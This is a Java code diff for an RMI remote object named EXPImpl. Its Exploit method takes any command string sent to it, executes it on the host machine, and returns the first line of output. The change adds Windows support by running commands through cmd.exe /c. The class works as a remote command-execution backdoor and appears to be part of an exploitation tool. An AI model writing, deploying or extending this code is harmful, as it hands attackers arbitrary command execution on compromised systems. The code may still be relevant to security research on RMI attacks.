@@ -14,10 +14,14 @@ public class EXPImpl extends UnicastRemoteObject implements EXP {
     public String Exploit(String cmd) throws IOException {
 
         //ProcessBuilder processBuilder = new ProcessBuilder("/bin/sh","-c",cmd);
-        Process process = Runtime.getRuntime().exec(cmd);
-        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+        Process p;
+        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
+            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
+        } else {
+            p = Runtime.getRuntime().exec(cmd);
+        }
+        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(p.getInputStream()));
         return bufferedReader.readLine();
-
 
     }
 }
